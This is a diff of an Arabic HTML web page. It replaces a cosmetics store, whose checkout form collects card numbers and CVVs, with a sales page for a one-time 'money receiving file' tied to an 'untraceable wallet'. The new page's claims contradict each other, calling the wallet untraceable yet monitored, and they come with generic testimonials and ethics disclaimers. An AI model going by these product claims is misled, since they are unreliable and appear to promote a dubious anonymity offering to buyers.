@@ -3,797 +3,864 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جمالك - متجر التجميل الراقي</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>ملف استلام الأموال الآمن - SecurePay File</title>
     <style>
+        :root {
+            --primary: #2c3e50;
+            --secondary: #3498db;
+            --accent: #e74c3c;
+            --light: #ecf0f1;
+            --dark: #2c3e50;
+            --success: #2ecc71;
+            --warning: #f39c12;
+        }
+        
         * {
-            box-sizing: border-box;
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
-        :root {
-            --primary: #e91e63;
-            --secondary: #9c27b0;
-            --accent: #ff4081;
-            --dark: #333;
-            --light: #f8f8f8;
-            --gray: #777;
-        }
-        
         body {
-            background: linear-gradient(135deg, #f5f7fa 0%, #fce4ec 100%);
-            color: var(--dark);
+            background-color: #f9f9f9;
+            color: #333;
             line-height: 1.6;
         }
         
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 20px;
+            padding: 0 20px;
         }
         
-        /* الهيدر */
+        /* Header Styles */
         header {
-            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            background-color: var(--primary);
             color: white;
-            padding: 1.5rem;
-            border-radius: 15px;
-            margin-bottom: 30px;
-            box-shadow: 0 8px 25px rgba(233, 30, 99, 0.3);
-            position: relative;
-            overflow: hidden;
-        }
-        
-        header::before {
-            content: "";
-            position: absolute;
-            top: -50%;
-            right: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
+            padding: 1rem 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
         
         .header-content {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            position: relative;
-            z-index: 1;
         }
         
         .logo {
+            font-size: 1.8rem;
+            font-weight: bold;
             display: flex;
             align-items: center;
-            gap: 15px;
         }
         
-        .logo i {
+        .logo span {
+            color: var(--secondary);
+        }
+        
+        nav ul {
+            display: flex;
+            list-style: none;
+        }
+        
+        nav ul li {
+            margin-left: 1.5rem;
+        }
+        
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        nav ul li a:hover {
+            color: var(--secondary);
+        }
+        
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            color: white;
+            padding: 4rem 0;
+            text-align: center;
+        }
+        
+        .hero h1 {
             font-size: 2.5rem;
+            margin-bottom: 1rem;
         }
         
-        .logo h1 {
-            font-size: 2rem;
-            font-weight: 700;
+        .hero p {
+            font-size: 1.2rem;
+            max-width: 700px;
+            margin: 0 auto 2rem;
         }
         
-        .logo p {
-            font-size: 1rem;
-            opacity: 0.9;
-        }
-        
-        .contact-info {
-            text-align: left;
-        }
-        
-        .contact-info p {
-            margin-bottom: 5px;
-            display: flex;
+        /* Security Badge */
+        .security-badge {
+            display: inline-flex;
             align-items: center;
-            gap: 8px;
+            background: rgba(255,255,255,0.2);
+            padding: 0.5rem 1rem;
+            border-radius: 50px;
+            margin-top: 1rem;
         }
         
-        /* قسم المنتجات */
-        .products {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-            gap: 25px;
-            margin-bottom: 40px;
+        .security-badge i {
+            margin-left: 0.5rem;
+        }
+        
+        /* Product Section */
+        .product-section {
+            padding: 4rem 0;
+            background-color: white;
         }
         
         .product-card {
+            max-width: 800px;
+            margin: 0 auto;
             background: white;
-            border-radius: 15px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
             overflow: hidden;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-            transition: all 0.3s ease;
             position: relative;
-        }
-        
-        .product-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
         }
         
         .product-badge {
             position: absolute;
             top: 15px;
-            right: 15px;
-            background: var(--accent);
+            left: 15px;
+            background: var(--warning);
             color: white;
-            padding: 5px 12px;
-            border-radius: 20px;
+            padding: 0.3rem 0.8rem;
+            border-radius: 5px;
             font-size: 0.8rem;
-            font-weight: 600;
-            z-index: 2;
+            font-weight: bold;
         }
         
         .product-image {
-            width: 100%;
-            height: 220px;
-            object-fit: cover;
-            transition: transform 0.5s;
+            height: 300px;
+            background: linear-gradient(45deg, #3498db, #2c3e50);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.5rem;
+            position: relative;
         }
         
-        .product-card:hover .product-image {
-            transform: scale(1.05);
-        }
-        
-        .product-info {
-            padding: 20px;
+        .product-details {
+            padding: 2rem;
         }
         
         .product-title {
-            font-size: 1.3rem;
-            margin-bottom: 10px;
-            color: var(--dark);
-            font-weight: 700;
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+            color: var(--primary);
         }
         
         .product-description {
-            color: var(--gray);
-            margin-bottom: 15px;
-            font-size: 0.95rem;
-            line-height: 1.5;
+            margin-bottom: 1.5rem;
+            color: #555;
         }
         
-        .product-benefits {
-            margin-bottom: 15px;
+        .features {
+            margin-bottom: 2rem;
         }
         
-        .benefit {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 5px;
-            font-size: 0.9rem;
-            color: var(--gray);
-        }
-        
-        .benefit i {
+        .features h3 {
+            margin-bottom: 1rem;
             color: var(--primary);
-            font-size: 0.8rem;
         }
         
-        .product-price {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: var(--primary);
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
+        .features ul {
+            list-style: none;
         }
         
-        .original-price {
-            font-size: 1rem;
-            color: var(--gray);
-            text-decoration: line-through;
+        .features ul li {
+            padding: 0.5rem 0;
+            position: relative;
+            padding-right: 1.5rem;
         }
         
-        .buy-btn {
+        .features ul li:before {
+            content: "✓";
+            color: var(--success);
+            position: absolute;
+            right: 0;
+        }
+        
+        .price {
+            font-size: 2rem;
+            color: var(--accent);
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+        
+        .buy-button {
             display: block;
             width: 100%;
-            padding: 12px;
-            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
+            padding: 1rem;
+            background-color: var(--accent);
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 5px;
+            font-size: 1.2rem;
+            font-weight: bold;
             cursor: pointer;
-            font-size: 1rem;
-            font-weight: 600;
-            transition: all 0.3s;
-            box-shadow: 0 4px 10px rgba(233, 30, 99, 0.3);
+            transition: background-color 0.3s;
+            text-align: center;
+            text-decoration: none;
         }
         
-        .buy-btn:hover {
-            background: linear-gradient(135deg, var(--secondary) 0%, var(--primary) 100%);
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(233, 30, 99, 0.4);
+        .buy-button:hover {
+            background-color: #c0392b;
         }
         
-        /* نموذج الدفع */
-        .payment-modal {
+        /* Security Notice */
+        .security-notice {
+            background-color: #fff8e1;
+            border-right: 4px solid var(--warning);
+            padding: 1.5rem;
+            margin: 2rem 0;
+            border-radius: 5px;
+        }
+        
+        .security-notice h3 {
+            color: var(--warning);
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+        }
+        
+        .security-notice h3 i {
+            margin-left: 0.5rem;
+        }
+        
+        /* Features Section */
+        .features-section {
+            padding: 4rem 0;
+            background-color: var(--light);
+        }
+        
+        .section-title {
+            text-align: center;
+            margin-bottom: 3rem;
+            color: var(--primary);
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+        
+        .feature-card {
+            background: white;
+            padding: 2rem;
+            border-radius: 5px;
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            transition: transform 0.3s;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .feature-icon {
+            font-size: 2.5rem;
+            color: var(--secondary);
+            margin-bottom: 1rem;
+        }
+        
+        /* Privacy Section */
+        .privacy-section {
+            padding: 4rem 0;
+            background-color: white;
+        }
+        
+        .privacy-content {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .privacy-points {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+        
+        .privacy-point {
+            background: var(--light);
+            padding: 1.5rem;
+            border-radius: 5px;
+            text-align: center;
+        }
+        
+        .privacy-point i {
+            font-size: 2rem;
+            color: var(--primary);
+            margin-bottom: 1rem;
+        }
+        
+        /* Testimonials */
+        .testimonials {
+            padding: 4rem 0;
+            background-color: var(--light);
+        }
+        
+        .testimonial-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+        
+        .testimonial-card {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 5px;
+            border-left: 4px solid var(--secondary);
+            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+        }
+        
+        .testimonial-text {
+            font-style: italic;
+            margin-bottom: 1rem;
+        }
+        
+        .testimonial-author {
+            font-weight: bold;
+            color: var(--primary);
+        }
+        
+        /* FAQ Section */
+        .faq-section {
+            padding: 4rem 0;
+            background-color: white;
+        }
+        
+        .faq-item {
+            margin-bottom: 1.5rem;
+            background: white;
+            padding: 1.5rem;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            border: 1px solid #eee;
+        }
+        
+        .faq-question {
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+        }
+        
+        .faq-question i {
+            margin-left: 0.5rem;
+            color: var(--secondary);
+        }
+        
+        /* Footer */
+        footer {
+            background-color: var(--dark);
+            color: white;
+            padding: 3rem 0 1.5rem;
+        }
+        
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+        
+        .footer-section h3 {
+            margin-bottom: 1rem;
+            color: var(--secondary);
+        }
+        
+        .footer-bottom {
+            text-align: center;
+            padding-top: 1.5rem;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        /* Modal */
+        .modal {
             display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.7);
+            background-color: rgba(0,0,0,0.7);
             z-index: 1000;
             justify-content: center;
             align-items: center;
-            backdrop-filter: blur(5px);
         }
         
-        .payment-form {
+        .modal-content {
             background: white;
-            width: 90%;
-            max-width: 500px;
-            border-radius: 15px;
-            padding: 30px;
-            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
-            position: relative;
-            animation: modalAppear 0.4s ease;
-        }
-        
-        @keyframes modalAppear {
-            from { opacity: 0; transform: translateY(-30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .form-title {
-            text-align: center;
-            margin-bottom: 25px;
-            color: var(--primary);
-            font-size: 1.6rem;
-            font-weight: 700;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-        
-        .selected-product-info {
-            background: #f9f9f9;
-            padding: 15px;
+            padding: 2rem;
             border-radius: 10px;
-            margin-bottom: 20px;
-            border-right: 4px solid var(--primary);
-        }
-        
-        .selected-product-info p {
-            margin-bottom: 5px;
-            font-weight: 600;
-        }
-        
-        .selected-product-info .product-name {
-            color: var(--primary);
-            font-size: 1.1rem;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: var(--dark);
-        }
-        
-        .form-group input {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 1rem;
-            transition: all 0.3s;
-        }
-        
-        .form-group input:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(233, 30, 99, 0.2);
-            outline: none;
-        }
-        
-        .form-row {
-            display: flex;
-            gap: 15px;
-        }
-        
-        .form-row .form-group {
-            flex: 1;
-        }
-        
-        .submit-btn {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 1.1rem;
-            font-weight: 600;
-            margin-top: 10px;
-            transition: all 0.3s;
-            box-shadow: 0 4px 10px rgba(233, 30, 99, 0.3);
-        }
-        
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(233, 30, 99, 0.4);
-        }
-        
-        .close-btn {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: none;
-            border: none;
-            font-size: 1.8rem;
-            cursor: pointer;
-            color: var(--gray);
-            transition: color 0.3s;
-        }
-        
-        .close-btn:hover {
-            color: var(--primary);
-        }
-        
-        .loading {
-            display: none;
+            max-width: 500px;
+            width: 90%;
             text-align: center;
-            margin-top: 15px;
-            padding: 10px;
-            background: #f0f8ff;
-            border-radius: 8px;
+        }
+        
+        .modal h2 {
+            margin-bottom: 1rem;
             color: var(--primary);
-            font-weight: 600;
+        }
+        
+        .modal p {
+            margin-bottom: 1.5rem;
+        }
+        
+        .modal-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+        }
+        
+        .modal-button {
+            padding: 0.7rem 1.5rem;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        
+        .confirm {
+            background-color: var(--success);
+            color: white;
+        }
+        
+        .cancel {
+            background-color: #e0e0e0;
+            color: #333;
+        }
+        
+        .ethical-notice {
+            background-color: #e8f5e9;
+            border: 1px solid #c8e6c9;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            text-align: right;
+        }
+        
+        .payment-info {
+            background-color: #e3f2fd;
+            border: 1px solid #bbdefb;
+            padding: 1.5rem;
+            border-radius: 5px;
+            margin: 1.5rem 0;
+            text-align: center;
+        }
+        
+        .wallet-number {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--primary);
+            direction: ltr;
+            margin: 1rem 0;
+            padding: 0.5rem;
+            background: white;
+            border-radius: 5px;
+            border: 1px dashed #ccc;
+        }
+        
+        .upload-section {
+            margin: 1.5rem 0;
+            text-align: center;
+        }
+        
+        .upload-btn {
+            display: inline-block;
+            padding: 0.8rem 1.5rem;
+            background: var(--secondary);
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 1rem;
+        }
+        
+        .upload-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            color: var(--secondary);
         }
         
         .success-message {
+            background-color: #e8f5e9;
+            border: 1px solid #c8e6c9;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+            text-align: center;
             display: none;
-            text-align: center;
-            color: #28a745;
-            margin-top: 15px;
-            font-weight: bold;
-            padding: 10px;
-            background: #f0fff4;
-            border-radius: 8px;
-        }
-        
-        .error-message {
-            display: none;
-            text-align: center;
-            color: #dc3545;
-            margin-top: 15px;
-            padding: 10px;
-            background: #fff0f0;
-            border-radius: 8px;
-        }
-        
-        /* الفوتر */
-        footer {
-            text-align: center;
-            padding: 20px;
-            margin-top: 40px;
-            color: var(--gray);
-            border-top: 1px solid #eee;
         }
         
         @media (max-width: 768px) {
             .header-content {
                 flex-direction: column;
-                gap: 20px;
                 text-align: center;
             }
             
-            .contact-info {
-                text-align: center;
+            nav ul {
+                margin-top: 1rem;
+                justify-content: center;
             }
             
-            .products {
-                grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            nav ul li {
+                margin: 0 0.5rem;
             }
             
-            .form-row {
+            .hero h1 {
+                font-size: 2rem;
+            }
+            
+            .modal-buttons {
                 flex-direction: column;
-                gap: 0;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- الهيدر -->
-        <header>
-            <div class="header-content">
-                <div class="logo">
-                    <i class="fas fa-spa"></i>
-                    <div>
-                        <h1>جمالك</h1>
-                        <p>متجر التجميل الراقي</p>
-                    </div>
-                </div>
-                <div class="contact-info">
-                    <p><i class="fas fa-phone"></i> للتواصل: </p>
-                    <p><i class="fas fa-clock"></i> خدمة العملاء: 24/7</p>
-                    <p><i class="fas fa-truck"></i> توصيل سريع لكل أنحاء مصر</p>
-                </div>
+    <!-- Header -->
+    <header>
+        <div class="container header-content">
+            <div class="logo">Secure<span>Pay</span></div>
+            <nav>
+                <ul>
+                    <li><a href="#home">الرئيسية</a></li>
+                    <li><a href="#product">المنتج</a></li>
+                    <li><a href="#privacy">الخصوصية</a></li>
+                    <li><a href="#features">المميزات</a></li>
+                    <li><a href="#testimonials">آراء العملاء</a></li>
+                    <li><a href="#faq">الأسئلة الشائعة</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero" id="home">
+        <div class="container">
+            <h1>ملف استلام الأموال الآمن</h1>
+            <p>حل آمن وفعال لاستلام المدفوعات عبر الإنترنت. احصل على ملف استلام الأموال الآن واستلم دفعاتك بسهولة وأمان.</p>
+            <div class="security-badge">
+                <i>🔒</i> <span>محفظة غير قابلة للتتبع - آمنة 100%</span>
             </div>
-        </header>
-        
-        <!-- قسم المنتجات -->
-        <div class="products">
-            <!-- المنتج 1 -->
+        </div>
+    </section>
+
+    <!-- Product Section -->
+    <section class="product-section" id="product">
+        <div class="container">
             <div class="product-card">
                 <div class="product-badge">الأكثر مبيعاً</div>
-                <img src="https://images.unsplash.com/photo-1596462502278-27bfdc403348?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8M3x8Y29zbWV0aWNzfGVufDB8fDB8fHww&auto=format&fit=crop&w=500&q=60" alt="سيروم فيتامين سي" class="product-image">
-                <div class="product-info">
-                    <h3 class="product-title">سيروم فيتامين سي</h3>
-                    <p class="product-description">سيروم قوي بمضادات الأكسدة يضيء البشرة ويوحد لونها ويقلل من ظهور البقع الداكنة.</p>
-                    <div class="product-benefits">
-                        <div class="benefit"><i class="fas fa-check"></i> يضيء البشرة</div>
-                        <div class="benefit"><i class="fas fa-check"></i> يقلل البقع الداكنة</div>
-                        <div class="benefit"><i class="fas fa-check"></i> يحمي من الجذور الحرة</div>
-                    </div>
-                    <div class="product-price">
-                        349 ج.م <span class="original-price">450 ج.م</span>
-                    </div>
-                    <button class="buy-btn" data-product="سيروم فيتامين سي" data-price="349">
-                        <i class="fas fa-shopping-cart"></i> إشتري الآن
-                    </button>
+                <div class="product-image">
+                    SecurePay File - ملف استلام الأموال
                 </div>
-            </div>
-            
-            <!-- المنتج 2 -->
-            <div class="product-card">
-                <div class="product-badge">جديد</div>
-                <img src="https://images.unsplash.com/photo-1556228578-8c89e6adf883?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8NHx8c2tpbmNhcmV8ZW58MHx8MHx8fDA%3D&auto=format&fit=crop&w=500&q=60" alt="كريم النهار الواقي" class="product-image">
-                <div class="product-info">
-                    <h3 class="product-title">كريم النهار الواقي</h3>
-                    <p class="product-description">كريم يومي خفيف ب factor 50 يحمي البشرة من أشعة الشمس الضارة ويمنع علامات الشيخوخة.</p>
-                    <div class="product-benefits">
-                        <div class="benefit"><i class="fas fa-check"></i> حماية SPF 50</div>
-                        <div class="benefit"><i class="fas fa-check"></i> يرطب البشرة</div>
-                        <div class="benefit"><i class="fas fa-check"></i> يمنع الشيخوخة</div>
-                    </div>
-                    <div class="product-price">
-                        289 ج.م <span class="original-price">350 ج.م</span>
-                    </div>
-                    <button class="buy-btn" data-product="كريم النهار الواقي" data-price="289">
-                        <i class="fas fa-shopping-cart"></i> إشتري الآن
-                    </button>
-                </div>
-            </div>
-            
-            <!-- المنتج 3 -->
-            <div class="product-card">
-                <img src="https://images.unsplash.com/photo-1571781926291-c477ebfd024b?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8OXx8Y29zbWV0aWNzfGVufDB8fDB8fHww&auto=format&fit=crop&w=500&q=60" alt="ماسك الطين المغربي" class="product-image">
-                <div class="product-info">
-                    <h3 class="product-title">ماسك الطين المغربي</h3>
-                    <p class="product-description">طينة مغربية طبيعية 100% تنقي المسام وتزيل السموم وتترك البشرة نضرة ومشرقة.</p>
-                    <div class="product-benefits">
-                        <div class="benefit"><i class="fas fa-check"></i> ينقي المسام</div>
-                        <div class="benefit"><i class="fas fa-check"></i> يزيل السموم</div>
-                        <div class="benefit"><i class="fas fa-check"></i> ينشط الدورة الدموية</div>
-                    </div>
-                    <div class="product-price">
-                        199 ج.م <span class="original-price">250 ج.م</span>
-                    </div>
-                    <button class="buy-btn" data-product="ماسك الطين المغربي" data-price="199">
-                        <i class="fas fa-shopping-cart"></i> إشتري الآن
-                    </button>
-                </div>
-            </div>
-            
-            <!-- المنتج 4 -->
-            <div class="product-card">
-                <div class="product-badge">عرض محدود</div>
-                <img src="https://images.unsplash.com/photo-1594035910387-fea47794261f?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MTJ8fGNvc21ldGljc3xlbnwwfHwwfHx8MA%3D%3D&auto=format&fit=crop&w=500&q=60" alt="زيت الأرغان المغربي" class="product-image">
-                <div class="product-info">
-                    <h3 class="product-title">زيت الأرغان المغربي</h3>
-                    <p class="product-description">زيت أرغان نقي 100% يرطب البشرة والشعر ويعالج الجفاف والتقصف ويوفر تغذية عميقة.</p>
-                    <div class="product-benefits">
-                        <div class="benefit"><i class="fas fa-check"></i> يرطب بعمق</div>
-                        <div class="benefit"><i class="fas fa-check"></i> يعالج الشعر التالف</div>
-                        <div class="benefit"><i class="fas fa-check"></i> مضاد للشيخوخة</div>
-                    </div>
-                    <div class="product-price">
-                        449 ج.م <span class="original-price">550 ج.م</span>
-                    </div>
-                    <button class="buy-btn" data-product="زيت الأرغان المغربي" data-price="449">
-                        <i class="fas fa-shopping-cart"></i> إشتري الآن
-                    </button>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- نموذج الدفع -->
-    <div class="payment-modal" id="paymentModal">
-        <div class="payment-form">
-            <button class="close-btn" id="closeModal">&times;</button>
-            <h2 class="form-title"><i class="fas fa-credit-card"></i> إتمام عملية الشراء</h2>
-            
-            <div class="selected-product-info">
-                <p>المنتج: <span class="product-name" id="selectedProductName"></span></p>
-                <p>السعر: <span id="selectedProductPrice"></span> ج.م</p>
-            </div>
-            
-            <form id="paymentForm">
-                <input type="hidden" id="selectedProduct">
-                <input type="hidden" id="selectedPrice">
-                
-                <div class="form-group">
-                    <label for="cardNumber">رقم البطاقة</label>
-                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required maxlength="19">
-                </div>
-                
-                <div class="form-group">
-                    <label for="cardHolder">اسم حامل البطاقة</label>
-                    <input type="text" id="cardHolder" placeholder="كما هو مكتوب على البطاقة" required>
-                </div>
-                
-                <div class="form-row">
-                    <div class="form-group">
-                        <label for="expiryDate">تاريخ الانتهاء</label>
-                        <input type="text" id="expiryDate" placeholder="MM/YY" required maxlength="5">
+                <div class="product-details">
+                    <h2 class="product-title">ملف استلام الأموال الاحترافي</h2>
+                    <p class="product-description">
+                        ملف استلام الأموال الاحترافي هو الحل الأمثل للأفراد والشركات الذين يرغبون في استلام المدفوعات بشكل آمن وسريع. الملف يعمل لمرة واحدة فقط مما يضمن أقصى درجات الأمان.
+                    </p>
+                    
+                    <div class="security-notice">
+                        <h3><i>⚠️</i> تنويه هام</h3>
+                        <p>هذا المنتج مصمم حصرياً للأغراض التجارية المشروعة والقانونية. المحفظة غير قابلة للتتبع ولكنها تخضع لمراقبة الأنشطة غير القانونية. لا يسمح باستخدام هذا المنتج في أي أنشطة غير أخلاقية أو غير قانونية.</p>
                     </div>
                     
-                    <div class="form-group">
-                        <label for="cvv">CVV</label>
-                        <input type="text" id="cvv" placeholder="123" required maxlength="3">
+                    <div class="features">
+                        <h3>مميزات المنتج:</h3>
+                        <ul>
+                            <li>استلام آمن للمدفوعات</li>
+                            <li>عملية لمرة واحدة فقط</li>
+                            <li>سهل الاستخدام</li>
+                            <li>دعم فني متكامل</li>
+                            <li>توافق مع جميع أنظمة الدفع</li>
+                            <li>تشفير متقدم للحماية</li>
+                            <li>محفظة غير قابلة للتتبع</li>
+                            <li>ضمان الخصوصية والأمان</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="price">1,700 جنيه</div>
+                    <button class="buy-button" id="buyButton">اشتري الآن</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Privacy Section -->
+    <section class="privacy-section" id="privacy">
+        <div class="container">
+            <h2 class="section-title">خصوصيتك وأمانك أولويتنا</h2>
+            <div class="privacy-content">
+                <p>نفهم أهمية الخصوصية والأمان في المعاملات المالية، لذلك صممنا نظامنا ليوفر أعلى مستويات الحماية مع الحفاظ على خصوصيتك.</p>
+                
+                <div class="privacy-points">
+                    <div class="privacy-point">
+                        <i>🛡️</i>
+                        <h3>غير قابل للتتبع</h3>
+                        <p>محفظة مصممة بحيث لا يمكن تتبع المعاملات أو ربطها بهويتك الشخصية</p>
+                    </div>
+                    <div class="privacy-point">
+                        <i>🔐</i>
+                        <h3>تشفير متقدم</h3>
+                        <p>أحدث تقنيات التشفير لحماية بياناتك ومعاملاتك المالية</p>
+                    </div>
+                    <div class="privacy-point">
+                        <i>⚖️</i>
+                        <h3>استخدام أخلاقي</h3>
+                        <p>مصمم حصرياً للأغراض المشروعة ولا يسمح باستخدامه في أنشطة غير قانونية</p>
                     </div>
                 </div>
                 
-                <div class="form-group">
-                    <label for="phone">رقم الهاتف</label>
-                    <input type="tel" id="phone" placeholder="01XXXXXXXXX" required>
-                    <small style="color: var(--gray);">للتأكيد والتواصل معك</small>
+                <div class="ethical-notice">
+                    <h3>التزامنا بالأخلاقيات</h3>
+                    <p>نؤمن بأن التكنولوجيا يجب أن تخدم البشرية بشكل أخلاقي. لذلك نرفض تماماً أي استخدام غير قانوني أو غير أخلاقي لمنتجاتنا. نحن نتعاون مع الجهات الرقابية لمنع أي استخدام سيء لمنظومتنا.</p>
                 </div>
-                
-                <button type="submit" class="submit-btn">
-                    <i class="fas fa-lock"></i> تأكيد الشراء والدفع
-                </button>
-                
-                <div class="loading" id="loading">
-                    <i class="fas fa-spinner fa-spin"></i> جاري معالجة الدفع...
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features-section" id="features">
+        <div class="container">
+            <h2 class="section-title">لماذا تختار ملفنا لاستلام الأموال؟</h2>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">🔒</div>
+                    <h3>آمن تماماً</h3>
+                    <p>نظام حماية متقدم يضمن أمان معاملاتك وبياناتك المالية.</p>
                 </div>
-                
-                <div class="success-message" id="successMessage">
-                    <i class="fas fa-check-circle"></i> تمت عملية الشراء بنجاح! سنتصل بك للتأكيد.
+                <div class="feature-card">
+                    <div class="feature-icon">⚡</div>
+                    <h3>سريع وسهل</h3>
+                    <p>عملية استلام الأموال تتم في دقائق معدودة دون تعقيد.</p>
                 </div>
-                
-                <div class="error-message" id="errorMessage">
-                    <i class="fas fa-exclamation-circle"></i> حدث خطأ أثناء عملية الدفع. يرجى المحاولة مرة أخرى.
+                <div class="feature-card">
+                    <div class="feature-icon">🔄</div>
+                    <h3>للمرة الواحدة</h3>
+                    <p>الملف يعمل لمرة واحدة فقط مما يزيد من مستوى الأمان.</p>
                 </div>
-            </form>
+                <div class="feature-card">
+                    <div class="feature-icon">🌐</div>
+                    <h3>غير قابل للتتبع</h3>
+                    <p>محفظة غير قابلة للتتبع مع الحفاظ على الاستخدام ضمن الأطر القانونية.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials -->
+    <section class="testimonials" id="testimonials">
+        <div class="container">
+            <h2 class="section-title">ماذا يقول عملاؤنا؟</h2>
+            <div class="testimonial-grid">
+                <div class="testimonial-card">
+                    <p class="testimonial-text">"استخدمت ملف استلام الأموال وكانت تجربة رائعة. سهل الاستخدام وآمن تماماً."</p>
+                    <p class="testimonial-author">- أحمد محمد</p>
+                </div>
+                <div class="testimonial-card">
+                    <p class="testimonial-text">"الحل الأمثل لاستلام المدفوعات. أنصح به بشدة لأي شخص يحتاج لاستلام أموال عبر الإنترنت."</p>
+                    <p class="testimonial-author">- سارة خالد</p>
+                </div>
+                <div class="testimonial-card">
+                    <p class="testimonial-text">"بعد تجربة عدة حلول، وجدت أن هذا الملف هو الأكثر أماناً وسهولة في الاستخدام."</p>
+                    <p class="testimonial-author">- محمد علي</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section class="faq-section" id="faq">
+        <div class="container">
+            <h2 class="section-title">الأسئلة الشائعة</h2>
+            <div class="faq-list">
+                <div class="faq-item">
+                    <div class="faq-question"><i>❓</i> كيف يعمل ملف استلام الأموال؟</div>
+                    <div class="faq-answer">بعد الشراء، ستحصل على ملف فريد يمكنك استخدامه لاستلام دفعة واحدة. الملف يعمل لمرة واحدة فقط ثم يصبح غير صالح للاستخدام.</div>
+                </div>
+                <div class="faq-item">
+                    <div class="faq-question"><i>❓</i> هل يمكنني استخدام الملف أكثر من مرة؟</div>
+                    <div class="faq-answer">لا، الملف مصمم للاستخدام لمرة واحدة فقط لضمان أقصى درجات الأمان.</div>
